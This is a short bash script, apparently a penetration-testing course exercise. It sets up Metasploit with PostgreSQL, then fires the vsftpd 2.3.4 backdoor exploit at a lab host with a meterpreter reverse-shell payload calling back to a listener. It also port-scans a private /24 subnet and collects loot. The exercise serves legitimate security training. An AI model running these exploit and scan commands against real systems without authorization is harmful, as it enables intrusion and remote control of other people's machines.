#!/usr/bin/env bash
# metasploit_workflow.sh
# Simulated end‑to‑end workflow for 0x03_metasploit_basics

# ---------- Part 1: Setup Metasploit with PostgreSQL ----------
sudo apt update
sudo apt install -y postgresql postgresql-contrib metasploit-framework
sudo systemctl enable --now postgresql

# Create postgres user and database for Metasploit
sudo -u postgres createuser --superuser msf
sudo -u postgres createdb -O msf msf_database

# Initialize Metasploit database
msfdb init

# ---------- Part 2: Basic Usage ----------
msfconsole -q <<'EOF'
version
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.105
set LHOST 192.168.1.100
set LPORT 4444
set PAYLOAD linux/x86/meterpreter/reverse_tcp
run -z
notes add -t host -n "VSFTPD exploit launched against 192.168.1.105"
loot -t csv
exit -y
EOF

# ---------- Part 3: Payload Creation ----------
# (payload.elf already generated with msfvenom)

# ---------- Part 4: Auxiliary Module ----------
msfconsole -q <<'EOF'
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set THREADS 50
run
notes add -t host -n "TCP port scan completed for 192.168.1.0/24"
loot -t csv
exit -y
EOF

# ---------- Part 5: Report Generation ----------
echo "All tasks completed. Notes and loot CSV available in ~/.msf4/loot/"
